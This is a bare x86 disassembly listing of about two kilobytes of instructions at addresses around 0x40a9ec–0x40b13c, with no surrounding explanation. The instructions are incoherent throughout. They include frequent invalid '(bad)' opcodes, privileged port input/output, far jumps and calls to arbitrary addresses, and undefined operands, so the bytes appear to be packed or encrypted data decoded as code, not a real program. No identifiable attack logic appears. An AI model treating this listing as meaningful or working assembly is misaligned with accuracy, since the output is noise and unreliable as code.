  40a9ec:	lods   al,BYTE PTR ds:[esi]
  40a9ed:	retf   0x228b
  40a9f0:	push   edx
  40a9f1:	add    eax,0x74e3bc6c
  40a9f6:	inc    ebx
  40a9f7:	scas   al,BYTE PTR es:[edi]
  40a9f8:	mov    DWORD PTR ds:0x1e9900ea,0x32fe919e
  40aa02:	dec    esp
  40aa03:	dec    esp
  40aa04:	xchg   BYTE PTR [ebp+0x6ce8a4fc],bh
  40aa0a:	sbb    DWORD PTR [ecx+ecx*8-0x46],0x412cffbd
  40aa12:	out    dx,eax
  40aa13:	add    DWORD PTR [ebx+0x44],edi
  40aa16:	add    dh,BYTE PTR [edi-0x7047e1a4]
  40aa1c:	mov    ah,0x90
  40aa1e:	and    al,0xbe
  40aa20:	das    
  40aa21:	jo     0x40aa0a
  40aa23:	inc    esi
  40aa24:	cld    
  40aa25:	lods   al,BYTE PTR ds:[esi]
  40aa26:	jo     0x40aa30
  40aa28:	ds ins DWORD PTR es:[edi],dx
  40aa2a:	fsubrp st(3),st
  40aa2c:	stos   BYTE PTR es:[edi],al
  40aa2d:	cwde   
  40aa2e:	js     0x40aa2d
  40aa30:	fiadd  WORD PTR [edi+0x13]
  40aa33:	ret    
  40aa34:	cmp    esp,DWORD PTR [edi-0x17]
  40aa37:	pop    ds
  40aa38:	test   eax,0x4fe45bc1
  40aa3d:	stc    
  40aa3e:	cs in  al,dx
  40aa40:	imul   ebx,DWORD PTR [esi],0x92f0bd89
  40aa46:	sub    DWORD PTR [eax-0x243bdb5d],ebp
  40aa4c:	(bad)  
  40aa4d:	push   edx
  40aa4e:	loope  0x40aac5
  40aa50:	rcr    esi,1
  40aa52:	jmp    0xf701:0x6285885
  40aa59:	or     ebp,eax
  40aa5b:	push   ecx
  40aa5c:	pop    esi
  40aa5d:	lock mov al,ds:0xa2ba094
  40aa63:	cwde   
  40aa64:	add    esi,DWORD PTR [ebx+ebx*4]
  40aa67:	push   0xffffffc7
  40aa69:	ja     0x40aab4
  40aa6b:	push   esi
  40aa6c:	dec    eax
  40aa6d:	out    dx,al
  40aa6e:	daa    
  40aa6f:	sub    al,BYTE PTR [edx-0x38]
  40aa72:	or     eax,0x94adaa3e
  40aa77:	int    0x3d
  40aa79:	or     eax,0xb6109059
  40aa7e:	xchg   ecx,eax
  40aa7f:	add    ebx,DWORD PTR [ebx]
  40aa81:	mov    dh,0xe9
  40aa83:	jbe    0x40aadf
  40aa85:	cmp    eax,0x44bead9a
  40aa8a:	sbb    esp,edi
  40aa8c:	in     al,dx
  40aa8d:	fisttp DWORD PTR [edx+edx*8+0x25dcc889]
  40aa94:	and    BYTE PTR [eax+0x4a],al
  40aa97:	and    al,0xf0
  40aa99:	add    ebp,DWORD PTR [eax+0x21]
  40aa9c:	in     al,0xc6
  40aa9e:	clc    
  40aa9f:	int3   
  40aaa0:	xchg   DWORD PTR [ecx],esi
  40aaa2:	cmp    BYTE PTR [edi-0x34],dl
  40aaa5:	sub    eax,0x87b7edd
  40aaaa:	cmp    bh,ah
  40aaac:	hlt    
  40aaad:	xchg   ecx,eax
  40aaae:	stos   DWORD PTR es:[edi],eax
  40aaaf:	out    dx,eax
  40aab0:	out    dx,eax
  40aab1:	out    dx,eax
  40aab2:	pop    ebp
  40aab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aab4:	nop    DWORD PTR [edx+0x3df7201f]
  40aabb:	or     BYTE PTR [edi+0x26],0x3b
  40aabf:	fstp   QWORD PTR [ebx+0x437e6195]
  40aac5:	xor    al,0xd0
  40aac7:	pop    ss
  40aac8:	fadd   DWORD PTR ds:0xdbb0377a
  40aace:	icebp  
  40aacf:	out    dx,eax
  40aad0:	cli    
  40aad1:	mov    DWORD PTR [edx-0x785e426b],esi
  40aad7:	mov    ebx,0xbb552f98
  40aadc:	dec    ecx
  40aadd:	popf   
  40aade:	sub    dl,BYTE PTR [esi-0x5a479bff]
  40aae4:	sahf   
  40aae5:	inc    ebp
  40aae6:	je     0x40ab1b
  40aae8:	dec    ebx
  40aae9:	ss pop ds
  40aaeb:	and    eax,0x97dd3bde
  40aaf0:	fwait
  40aaf1:	mov    esi,0x9da596a5
  40aaf6:	adc    ebp,DWORD PTR [eax+0x5e]
  40aaf9:	(bad)  
  40aafb:	adc    ebx,DWORD PTR [ecx+0xaff8386]
  40ab01:	(bad)  
  40ab02:	mov    ds:0x30af8064,eax
  40ab07:	push   ss
  40ab08:	cmp    dh,dh
  40ab0a:	call   0x4eb65027
  40ab0f:	and    eax,0x92814f2d
  40ab14:	mov    ch,0x76
  40ab16:	xchg   ecx,eax
  40ab17:	push   eax
  40ab18:	jb     0x40aacc
  40ab1a:	pop    ebp
  40ab1b:	test   DWORD PTR [ecx],ebx
  40ab1d:	pop    esi
  40ab1e:	cmc    
  40ab1f:	dec    eax
  40ab20:	push   0x74cabaf6
  40ab25:	mov    ?,WORD PTR [ebx-0x65b43c20]
  40ab2b:	cmp    ecx,eax
  40ab2d:	dec    edx
  40ab2e:	fidiv  DWORD PTR [esi+0xb480901]
  40ab34:	imul   DWORD PTR ds:0x398e5bc0
  40ab3a:	push   cs
  40ab3b:	inc    ecx
  40ab3c:	pushf  
  40ab3d:	retf   0x5328
  40ab40:	inc    ecx
  40ab41:	jnp    0x40aaf7
  40ab43:	fbld   TBYTE PTR [esi-0x5bbccd4f]
  40ab49:	sub    BYTE PTR [esi+0x6c],bl
  40ab4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab4d:	daa    
  40ab4e:	xchg   esi,eax
  40ab4f:	imul   ebx,DWORD PTR [edx+0x7b90875f],0x46565c7
  40ab59:	mov    ebx,0xd27ec09a
  40ab5e:	jae    0x40abc7
  40ab60:	aad    0xd6
  40ab62:	sar    BYTE PTR [ebp+0x440811ec],0xc6
  40ab69:	test   al,0xd7
  40ab6b:	in     eax,dx
  40ab6c:	inc    ecx
  40ab6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab6e:	iret   
  40ab6f:	cld    
  40ab70:	mov    BYTE PTR ds:0x2f92dd1e,dh
  40ab76:	dec    esp
  40ab77:	mov    al,0x4b
  40ab79:	daa    
  40ab7a:	or     cl,BYTE PTR [edi-0x3f]
  40ab7d:	sbb    eax,0xd7517c36
  40ab82:	sub    eax,0xa5b2f34
  40ab87:	ss pushf 
  40ab89:	push   esp
  40ab8a:	jnp    0x40abcf
  40ab8c:	repnz dec ebx
  40ab8e:	scas   al,BYTE PTR es:[edi]
  40ab8f:	(bad)  
  40ab90:	fstp   st(3)
  40ab92:	adc    al,0x8d
  40ab94:	cmp    DWORD PTR [ebp+0x35],ebx
  40ab97:	jno    0x40ab94
  40ab99:	mov    ?,WORD PTR [edi-0x47]
  40ab9c:	inc    ebx
  40ab9d:	lds    ebx,FWORD PTR [edx]
  40ab9f:	rcl    bh,cl
  40aba1:	xchg   edi,eax
  40aba2:	push   esi
  40aba3:	add    BYTE PTR [edx+0x6b],0x6f
  40aba7:	xchg   esi,eax
  40aba8:	int    0xa3
  40abaa:	mov    al,0xfe
  40abac:	xor    DWORD PTR [ecx],ebx
  40abae:	sbb    eax,DWORD PTR [edx-0x7e]
  40abb1:	sbb    DWORD PTR [edx-0x66bf2390],0xffffffd5
  40abb8:	in     eax,dx
  40abb9:	add    esp,edx
  40abbb:	loopne 0x40abab
  40abbd:	xchg   edx,eax
  40abbe:	and    eax,0xc462048e
  40abc3:	jle    0x40abbb
  40abc5:	and    BYTE PTR [ecx-0x34e02f26],0xb4
  40abcc:	push   ebp
  40abcd:	int3   
  40abce:	add    eax,edx
  40abd0:	cmp    ebp,DWORD PTR [ebx+0x6638aa76]
  40abd6:	push   ebx
  40abd7:	enter  0x76eb,0x7f
  40abdb:	mov    al,ds:0xa61f0c75
  40abe0:	stos   BYTE PTR es:[edi],al
  40abe1:	sub    BYTE PTR [edi+edi*8],cl
  40abe4:	bnd js 0x40ac01
  40abe7:	int    0x66
  40abe9:	inc    eax
  40abea:	xor    eax,0x4a461738
  40abef:	add    ah,0xbf
  40abf2:	scas   eax,DWORD PTR es:[edi]
  40abf3:	push   ecx
  40abf4:	shl    BYTE PTR [eax+0x23],0x2b
  40abf8:	je     0x40ab7a
  40abfa:	inc    esi
  40abfb:	and    ah,bh
  40abfd:	add    eax,0x1ded54ff
  40ac02:	xchg   bh,al
  40ac04:	sbb    BYTE PTR [ecx+0x14],dl
  40ac07:	(bad)  
  40ac08:	hlt    
  40ac09:	sbb    BYTE PTR [edi+0x41],ah
  40ac0c:	repnz call 0x215c:0xdd396a68
  40ac14:	jl     0x40ac2e
  40ac16:	inc    eax
  40ac17:	sahf   
  40ac18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac19:	sar    DWORD PTR [ebp-0x4b],1
  40ac1c:	lahf   
  40ac1d:	bound  ebp,QWORD PTR [ebp+0x33]
  40ac20:	and    eax,eax
  40ac22:	mov    al,ds:0xed3a9194
  40ac27:	xor    eax,DWORD PTR [edx+eax*4]
  40ac2a:	mov    ds:0x78f5a8d3,eax
  40ac2f:	and    dl,BYTE PTR [esi-0x47]
  40ac32:	or     eax,0x6725d469
  40ac37:	or     eax,0xd51136f6
  40ac3c:	sub    al,0x1e
  40ac3e:	inc    ebp
  40ac3f:	mov    ?,WORD PTR [edx]
  40ac41:	or     al,0xc0
  40ac43:	or     al,0x74
  40ac45:	pop    ds
  40ac46:	jo     0x40ac1b
  40ac48:	fld    QWORD PTR [ebx]
  40ac4a:	mov    ebp,0xe68148a2
  40ac4f:	add    DWORD PTR [edi+0x5d741d5d],ebx
  40ac55:	jmp    0x1819:0xe43cb607
  40ac5c:	jo     0x40acb1
  40ac5e:	mov    ah,0x68
  40ac60:	sub    ch,BYTE PTR [edx+0x5f7b607c]
  40ac66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac67:	dec    esp
  40ac68:	push   edi
  40ac69:	in     al,0xc5
  40ac6b:	adc    BYTE PTR [ebp-0x6ea9fb76],dl
  40ac71:	in     eax,0xe1
  40ac73:	aam    0x60
  40ac75:	push   es
  40ac76:	jmp    edi
  40ac78:	push   cs
  40ac79:	int3   
  40ac7a:	stc    
  40ac7b:	inc    esp
  40ac7c:	push   ds
  40ac7d:	mov    ds:0x89ef499f,al
  40ac82:	dec    edi
  40ac83:	fld    TBYTE PTR [esi+edi*1+0x544249ff]
  40ac8a:	into   
  40ac8b:	mov    ch,0xf5
  40ac8d:	in     al,0x9c
  40ac8f:	sbb    DWORD PTR [ebp-0x6cb9e15d],ecx
  40ac95:	cmp    DWORD PTR [eax-0x63],ebx
  40ac98:	imul   esp,DWORD PTR [ecx-0x4cfca7cf],0xffffff9b
  40ac9f:	mov    cl,0xa2
  40aca1:	add    BYTE PTR [edi],cl
  40aca3:	cdq    
  40aca4:	retf   
  40aca5:	int    0xa4
  40aca7:	lea    ebp,ds:0x68143f52
  40acad:	pop    esi
  40acae:	sbb    bh,dl
  40acb0:	sbb    ch,BYTE PTR [esp+edx*4+0x3c]
  40acb4:	fwait
  40acb5:	adc    eax,0xbe8c4b31
  40acba:	dec    ebx
  40acbb:	jmp    DWORD PTR [ecx+ecx*4]
  40acbe:	and    al,0x34
  40acc0:	inc    ecx
  40acc1:	fisub  WORD PTR [eax]
  40acc3:	in     eax,dx
  40acc4:	sbb    BYTE PTR [edi-0x845453],cl
  40acca:	das    
  40accb:	sub    al,0x13
  40accd:	cmp    BYTE PTR [ebx-0x20],dl
  40acd0:	pop    edi
  40acd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acd2:	fdivp  st(1),st
  40acd4:	test   DWORD PTR [eax+0x4b9e36f3],0xd3e3cbc5
  40acde:	xchg   esp,eax
  40acdf:	icebp  
  40ace0:	ins    DWORD PTR es:[edi],dx
  40ace1:	sti    
  40ace2:	adc    al,0x5d
  40ace4:	mov    ds:0x72e6df2b,al
  40ace9:	fidiv  WORD PTR [edi+ecx*8]
  40acec:	push   esi
  40aced:	sub    edi,edx
  40acef:	xchg   ecx,eax
  40acf0:	daa    
  40acf1:	pop    ds
  40acf2:	out    dx,al
  40acf3:	pop    esp
  40acf4:	out    0x7,eax
  40acf6:	jne    0x40aca0
  40acf8:	xchg   BYTE PTR [edx],ch
  40acfa:	sbb    edx,edi
  40acfc:	xor    BYTE PTR [ecx-0x7fb4848d],bl
  40ad02:	xchg   ecx,eax
  40ad03:	aam    0x23
  40ad05:	pushf  
  40ad06:	xchg   ebp,eax
  40ad07:	mov    BYTE PTR [ecx+edx*1-0x22],dl
  40ad0b:	sbb    ebp,DWORD PTR [edx-0x70266d49]
  40ad11:	dec    ecx
  40ad12:	dec    eax
  40ad13:	in     eax,dx
  40ad14:	mov    bh,0x4e
  40ad16:	mov    ebx,0x7d641a07
  40ad1b:	inc    esi
  40ad1c:	std    
  40ad1d:	outs   dx,DWORD PTR ds:[esi]
  40ad1e:	cmp    edi,DWORD PTR [esi]
  40ad20:	(bad)
  40ad25:	call   0x793b:0xf38f3a2a
  40ad2c:	arpl   WORD PTR [eax+0x36],di
  40ad2f:	xchg   edi,eax
  40ad30:	ret    0xe991
  40ad33:	push   ebx
  40ad34:	in     al,0xf6
  40ad36:	(bad)  
  40ad37:	xchg   ebp,eax
  40ad38:	ins    DWORD PTR es:[edi],dx
  40ad39:	push   edi
  40ad3a:	mov    ds:0x44675c5b,eax
  40ad3f:	aas    
  40ad40:	fild   DWORD PTR [ecx]
  40ad42:	sbb    ah,BYTE PTR [ecx+0x2]
  40ad45:	stc    
  40ad46:	inc    esp
  40ad47:	jle    0x40adb4
  40ad49:	jge    0x40ada4
  40ad4b:	daa    
  40ad4c:	(bad)  
  40ad4d:	(bad)  
  40ad4e:	jmp    0xcdf180b
  40ad53:	adc    al,0x3e
  40ad55:	sub    eax,0x278f4611
  40ad5a:	popa   
  40ad5b:	gs jle 0x40ad82
  40ad5e:	sahf   
  40ad5f:	(bad)  
  40ad60:	das    
  40ad61:	rol    DWORD PTR [ebx+0x7f46d6b1],1
  40ad67:	ds xchg ecx,eax
  40ad69:	gs aam 0x74
  40ad6c:	sub    BYTE PTR [edx+0x2a3a5d5e],ah
  40ad72:	(bad)  
  40ad73:	and    eax,0x9fbe770a
  40ad78:	(bad)  
  40ad7a:	xlat   BYTE PTR ds:[ebx]
  40ad7b:	test   al,0xe6
  40ad7d:	jno    0x40ad63
  40ad7f:	enter  0x62b4,0x28
  40ad83:	out    dx,al
  40ad84:	jl     0x40ad06
  40ad86:	pop    edx
  40ad87:	(bad)  
  40ad88:	jmp    0x1e86ca32
  40ad8d:	inc    ebp
  40ad8e:	jnp    0x40ad76
  40ad90:	and    ecx,edx
  40ad92:	xlat   BYTE PTR ds:[ebx]
  40ad93:	fs hlt 
  40ad95:	iret   
  40ad96:	cmc    
  40ad97:	jnp    0x40ada7
  40ad99:	cmc    
  40ad9a:	mov    bh,0xc8
  40ad9c:	(bad)  
  40ad9d:	and    al,0x6
  40ad9f:	mov    ch,0x2
  40ada1:	cmc    
  40ada2:	das    
  40ada3:	inc    ecx
  40ada4:	and    ah,BYTE PTR [esi]
  40ada6:	mov    ebx,0x8427787a
  40adab:	call   0xb3238661
  40adb0:	mov    cl,0xb4
  40adb2:	and    BYTE PTR [ebp+eax*8+0x2f],al
  40adb6:	scas   al,BYTE PTR es:[edi]
  40adb7:	js     0x40ad87
  40adb9:	call   FWORD PTR [eax+0x2e692c68]
  40adbf:	xchg   ecx,eax
  40adc0:	aad    0xde
  40adc2:	and    esi,DWORD PTR [ecx]
  40adc4:	pop    ss
  40adc5:	inc    edx
  40adc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adc7:	call   0x4ce9:0xe3d7f17b
  40adce:	lock out 0x76,eax
  40add1:	pop    ecx
  40add2:	ja     0x40adac
  40add4:	shr    DWORD PTR [edx-0x7a],0xd
  40add8:	inc    ebp
  40add9:	mov    esi,0xf8eb4cf4
  40adde:	dec    ecx
  40addf:	or     eax,0x7453e264
  40ade4:	aas    
  40ade5:	dec    esi
  40ade6:	out    0xad,al
  40ade8:	pusha  
  40ade9:	std    
  40adea:	mov    eax,0x53e747f
  40adef:	pushf  
  40adf0:	push   0xf949da6f
  40adf5:	mov    ds:0x9e48aeaa,eax
  40adfa:	jecxz  0x40ae52
  40adfc:	outs   dx,DWORD PTR ds:[esi]
  40adfd:	pop    ebp
  40adfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae00:	out    dx,al
  40ae01:	inc    edx
  40ae02:	jbe    0x40adef
  40ae04:	xor    DWORD PTR [ebp-0x1a],0xffffffaa
  40ae08:	arpl   di,sp
  40ae0a:	mov    bh,0x9e
  40ae0c:	mov    edx,0xc529999c
  40ae11:	push   ds
  40ae12:	repnz push esp
  40ae14:	mov    al,0x74
  40ae16:	inc    eax
  40ae17:	inc    ebx
  40ae18:	push   eax
  40ae19:	rcr    BYTE PTR [edi+0x494d5164],cl
  40ae1f:	xor    BYTE PTR [ebx-0x56ea2bd9],bl
  40ae25:	jecxz  0x40ae6d
  40ae27:	sbb    ebp,0xffffff9e
  40ae2a:	sbb    esp,0x5d
  40ae2d:	(bad)  
  40ae2e:	cmc    
  40ae2f:	mov    esp,edx
  40ae31:	enter  0xaeea,0x17
  40ae35:	push   ebp
  40ae36:	out    dx,eax
  40ae37:	add    dh,BYTE PTR [ebp+0x68]
  40ae3a:	mov    eax,ds:0x4e09abc7
  40ae3f:	push   ecx
  40ae40:	inc    edi
  40ae41:	cmp    al,0xbe
  40ae43:	cmp    DWORD PTR [edi],ecx
  40ae45:	aas    
  40ae46:	dec    esp
  40ae47:	sahf   
  40ae48:	adc    al,0x55
  40ae4a:	(bad)  
  40ae4b:	jmp    0x40ae6e
  40ae4d:	lods   al,BYTE PTR ds:[esi]
  40ae4e:	sti    
  40ae4f:	mov    WORD PTR [eax],ds
  40ae51:	(bad)  
  40ae52:	shr    DWORD PTR ds:0xecec169,cl
  40ae58:	aad    0xb2
  40ae5a:	mov    edx,0x5d333986
  40ae5f:	(bad)  
  40ae60:	js     0x40ade7
  40ae62:	loope  0x40aed1
  40ae64:	xor    esp,DWORD PTR [esi+0x27ac45dd]
  40ae6a:	or     eax,0x2bc70e15
  40ae6f:	sahf   
  40ae70:	lds    esi,FWORD PTR ds:0x7bb8fd39
  40ae76:	je     0x40ae98
  40ae78:	sub    DWORD PTR [ebp+edi*4+0x31],eax
  40ae7c:	xchg   esi,eax
  40ae7d:	push   esi
  40ae7e:	mov    ah,0x75
  40ae80:	inc    edi
  40ae81:	add    ebx,edi
  40ae83:	outs   dx,BYTE PTR ds:[esi]
  40ae84:	mov    dl,0xff
  40ae86:	(bad)  
  40ae87:	jb     0x40aef9
  40ae89:	adc    eax,0xe26575f7
  40ae8e:	scas   al,BYTE PTR es:[edi]
  40ae8f:	mov    esi,0xa2ebaf94
  40ae94:	gs mov eax,0xf01c5d86
  40ae9a:	cmp    BYTE PTR [ecx],dh
  40ae9c:	fst    st(7)
  40ae9e:	rcr    DWORD PTR cs:[edx],0x74
  40aea2:	bound  esi,QWORD PTR [ebp+ecx*2+0x126f7677]
  40aea9:	mov    edx,ecx
  40aeab:	fs sti 
  40aead:	mov    dl,0x4a
  40aeaf:	add    BYTE PTR [esi-0x33],dl
  40aeb2:	lds    ecx,FWORD PTR [eax]
  40aeb4:	jecxz  0x40ae4d
  40aeb6:	mov    ch,0x9c
  40aeb8:	xor    bh,BYTE PTR [ecx-0x7b]
  40aebb:	sub    BYTE PTR [esi+ebx*8],al
  40aebe:	jnp    0x40ae99
  40aec0:	inc    ebp
  40aec1:	bound  edi,QWORD PTR [ecx-0x24]
  40aec4:	rol    BYTE PTR [ebx+0x2aae7440],cl
  40aeca:	dec    ecx
  40aecb:	out    0x21,al
  40aecd:	loop   0x40af3a
  40aecf:	mov    bl,0x8
  40aed1:	fcmovnb st,st(4)
  40aed4:	arpl   WORD PTR [ebx-0x56d45021],cx
  40aeda:	or     DWORD PTR [eax-0x6987f952],eax
  40aee0:	ja     0x40aee4
  40aee2:	add    edi,edi
  40aee4:	mov    BYTE PTR [edi-0x6d],0x70
  40aee8:	fs (bad) 
  40aeea:	mov    eax,0xd1795291
  40aeef:	xor    eax,0x11075840
  40aef4:	fst    DWORD PTR [edi-0x4bf844af]
  40aefa:	xor    eax,0x402cd67f
  40aeff:	xchg   ecx,eax
  40af00:	jb     0x40af01
  40af02:	retf   
  40af03:	pop    ds
  40af04:	in     al,dx
  40af05:	push   edx
  40af06:	retf   
  40af07:	xchg   esi,eax
  40af08:	leave  
  40af09:	call   0xb168:0xb711197f
  40af10:	lods   al,BYTE PTR ds:[esi]
  40af11:	mov    DWORD PTR [ebp+0x3d],esp
  40af14:	mov    ch,0x13
  40af16:	stos   DWORD PTR es:[edi],eax
  40af17:	sbb    DWORD PTR [edi-0x5c],ebp
  40af1a:	xor    al,0xb2
  40af1c:	pop    ecx
  40af1d:	cmp    DWORD PTR [ebx],ecx
  40af1f:	in     al,dx
  40af20:	adc    al,0x7c
  40af22:	xlat   BYTE PTR ds:[ebx]
  40af23:	aaa    
  40af24:	mov    dl,0xcb
  40af26:	or     BYTE PTR [ebx+0x453ddd36],bl
  40af2c:	daa    
  40af2d:	rcl    bh,1
  40af2f:	and    al,0x1e
  40af31:	test   BYTE PTR [eax],dl
  40af33:	cdq    
  40af34:	ins    DWORD PTR es:[edi],dx
  40af35:	retf   0x344a
  40af38:	hlt    
  40af39:	mov    ah,0x7d
  40af3b:	sar    BYTE PTR [edi+ebp*8],1
  40af3e:	icebp  
  40af3f:	out    0x24,al
  40af41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af42:	gs (bad) 
  40af44:	push   eax
  40af45:	(bad)  
  40af46:	call   0xdc2bd91d
  40af4b:	lods   eax,DWORD PTR ds:[esi]
  40af4c:	out    0xe7,al
  40af4e:	std    
  40af4f:	adc    DWORD PTR [edx+0x2d],ebx
  40af52:	dec    esp
  40af53:	mov    ebp,0x547195f3
  40af58:	jp     0x40af52
  40af5a:	push   ds
  40af5b:	mov    ebx,0xae173301
  40af60:	test   eax,0xf7eb4633
  40af65:	or     DWORD PTR [edx],edx
  40af67:	push   ecx
  40af68:	aaa    
  40af69:	mov    WORD PTR [ecx-0x7819d8db],fs
  40af6f:	stc    
  40af70:	push   es
  40af71:	cwde   
  40af72:	mov    edi,cs
  40af74:	add    al,0xe0
  40af76:	int3   
  40af77:	fmul   DWORD PTR [ebx+edi*2]
  40af7a:	and    dl,ch
  40af7c:	ds clc 
  40af7e:	fimul  WORD PTR [ecx]
  40af80:	xchg   edi,eax
  40af81:	int3   
  40af82:	xchg   edx,eax
  40af83:	movaps xmm3,XMMWORD PTR fs:[ebp+0x845b2ab]
  40af8b:	arpl   WORD PTR [edx+0x4af1f684],ax
  40af91:	gs pop esi
  40af93:	pop    ecx
  40af94:	aaa    
  40af95:	and    BYTE PTR [ebx+0x37],cl
  40af98:	sub    al,0x35
  40af9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af9b:	pop    eax
  40af9c:	ror    BYTE PTR [ecx+0x700c1a7b],0x0
  40afa3:	call   FWORD PTR ds:0x460a9fd8
  40afa9:	out    0xa1,eax
  40afab:	popa   
  40afac:	xlat   BYTE PTR ds:[ebx]
  40afad:	push   ebp
  40afae:	popa   
  40afaf:	jnp    0x40af32
  40afb1:	mov    ecx,0x906f3514
  40afb6:	mov    ds:0xbf26610d,eax
  40afbb:	aad    0x6c
  40afbd:	mov    al,ds:0x6973f645
  40afc2:	xor    DWORD PTR [esi],ebp
  40afc4:	test   edi,eax
  40afc6:	call   0x21766299
  40afcb:	bound  edx,QWORD PTR [ebp-0x32]
  40afce:	data16 stc 
  40afd0:	mov    ah,al
  40afd2:	lods   eax,DWORD PTR ds:[esi]
  40afd3:	call   0xcc7a3b56
  40afd8:	scas   al,BYTE PTR es:[edi]
  40afd9:	or     esp,DWORD PTR [edx-0x6549f8c1]
  40afdf:	xor    bh,ch
  40afe1:	cmp    DWORD PTR [ecx+0x7b3c1974],ebp
  40afe7:	and    edx,DWORD PTR [edi]
  40afe9:	push   edi
  40afea:	mov    ah,0xbe
  40afec:	out    0x3a,eax
  40afee:	inc    esi
  40afef:	cdq    
  40aff0:	inc    esp
  40aff1:	pushf  
  40aff2:	xchg   BYTE PTR [ebx+0xa],al
  40aff5:	popa   
  40aff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aff7:	xor    eax,0xca3470f6
  40affc:	xchg   ebx,eax
  40affd:	and    ebp,DWORD PTR [ebx]
  40afff:	inc    ebp
  40b000:	test   DWORD PTR [ebp-0x2bceb4dc],ebx
  40b006:	in     eax,dx
  40b007:	into   
  40b008:	iret   
  40b009:	xchg   esi,eax
  40b00a:	mov    eax,0x665b11a0
  40b00f:	adc    eax,0xd195e7f6
  40b015:	out    dx,eax
  40b016:	in     al,0x23
  40b018:	and    eax,0x966d2af9
  40b01d:	sbb    al,0x87
  40b01f:	rcr    bh,0x7b
  40b022:	stc    
  40b023:	pop    esp
  40b024:	or     bh,cl
  40b026:	pusha  
  40b027:	stos   BYTE PTR es:[edi],al
  40b028:	pop    ss
  40b029:	pop    ebx
  40b02a:	sbb    esi,DWORD PTR [edi]
  40b02c:	in     eax,dx
  40b02d:	jmp    0x30dafbac
  40b032:	push   eax
  40b033:	jo     0x40b04b
  40b035:	popf   
  40b036:	gs inc ecx
  40b039:	mov    WORD PTR [eax-0x3],?
  40b03c:	mov    al,ah
  40b03e:	arpl   WORD PTR [edi-0x17],sp
  40b041:	sub    dl,BYTE PTR [edi]
  40b043:	and    BYTE PTR [ebp-0x17],bh
  40b046:	lock nop
  40b048:	je     0x40b0c5
  40b04a:	push   0xffffff8f
  40b04c:	scas   al,BYTE PTR es:[edi]
  40b04d:	je     0x40b07f
  40b04f:	inc    esi
  40b050:	ins    DWORD PTR es:[edi],dx
  40b051:	jae    0x40b0ae
  40b053:	js     0x40b01c
  40b055:	call   0xa582655c
  40b05a:	dec    edx
  40b05b:	push   ebp
  40b05c:	inc    esi
  40b05d:	jp     0x40b0d4
  40b05f:	adc    dl,BYTE PTR [ecx-0x7a]
  40b062:	xchg   edx,eax
  40b063:	jge    0x40b002
  40b065:	sbb    DWORD PTR [edi-0x51fb8300],eax
  40b06b:	jbe    0x40b04c
  40b06d:	popa   
  40b06e:	in     al,0x39
  40b070:	or     DWORD PTR [esi-0x13f6fb37],ebp
  40b076:	(bad)  
  40b077:	jns    0x40b02e
  40b079:	xchg   BYTE PTR [esi],dl
  40b07b:	jmp    0x40b0f1
  40b07d:	push   eax
  40b07e:	mov    ah,0xba
  40b080:	sbb    eax,0x3bc4983d
  40b085:	sbb    al,0x2d
  40b087:	mov    edx,0x66407409
  40b08c:	int3   
  40b08d:	(bad)  
  40b08e:	hlt    
  40b08f:	xor    dh,ch
  40b091:	xchg   esp,eax
  40b092:	ds call 0x7b38c1d7
  40b098:	data16 test BYTE PTR [edi+0xb],0xdc
  40b09d:	dec    edi
  40b09e:	adc    dl,BYTE PTR [edx+0x799abeb4]
  40b0a4:	mov    cl,0xf3
  40b0a6:	xor    DWORD PTR [eax+0x48],edi
  40b0a9:	dec    ecx
  40b0aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0ab:	cmp    eax,0x604969ba
  40b0b0:	pop    esp
  40b0b1:	mov    edx,0xdced96ae
  40b0b6:	xchg   BYTE PTR [eax+0x1e675bee],ah
  40b0bc:	mov    edx,0xcf3e10a5
  40b0c1:	mov    al,ds:0xaf9fc6db
  40b0c6:	jb     0x40b0d5
  40b0c8:	xlat   BYTE PTR ds:[ebx]
  40b0c9:	test   BYTE PTR [edx+eiz*8+0x3b],dh
  40b0cd:	cdq    
  40b0ce:	call   0x3ec8:0xe1adee12
  40b0d5:	xchg   esi,eax
  40b0d6:	xchg   DWORD PTR [edi+0x4d],edx
  40b0d9:	dec    ebp
  40b0da:	xlat   BYTE PTR ds:[ebx]
  40b0db:	add    DWORD PTR [edx+0x25],ebp
  40b0de:	pop    esi
  40b0df:	or     BYTE PTR [ecx+eax*1+0x4a4257c7],bh
  40b0e6:	add    eax,0x7c86dc29
  40b0eb:	jmp    0x40b0c3
  40b0ed:	mov    eax,ds:0x1b9be861
  40b0f2:	imul   BYTE PTR [eax+0x7631abcc]
  40b0f8:	int3   
  40b0f9:	clc    
  40b0fa:	adc    eax,DWORD PTR [ebx+0x7a]
  40b0fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0fe:	mov    dh,0x16
  40b100:	pop    esp
  40b101:	js     0x40b116
  40b103:	hlt    
  40b104:	add    DWORD PTR [eax+0x49],eax
  40b107:	in     al,dx
  40b108:	mov    edi,esi
  40b10a:	inc    esi
  40b10b:	jecxz  0x40b0db
  40b10d:	pop    eax
  40b10e:	or     al,0x5c
  40b110:	or     esi,DWORD PTR [edx+0x41]
  40b113:	int3   
  40b114:	or     BYTE PTR [ecx+ebx*4+0x35732205],cl
  40b11b:	repnz jecxz 0x40b173
  40b11e:	xchg   DWORD PTR [esi+0x65de1e67],ecx
  40b124:	push   esp
  40b125:	jmp    0x40b0d0
  40b127:	cdq    
  40b128:	xchg   esi,eax
  40b129:	jge    0x40b15d
  40b12b:	xchg   esp,eax
  40b12c:	out    0xf6,al
  40b12e:	jnp    0x40b122
  40b130:	sbb    edx,edi
  40b132:	ds ins BYTE PTR es:[edi],dx
  40b134:	sbb    DWORD PTR [ecx],0x4f
  40b137:	jno    0x40b189
  40b139:	popf   
  40b13a:	fs iret 
  40b13c:	jns    0x40b1b2
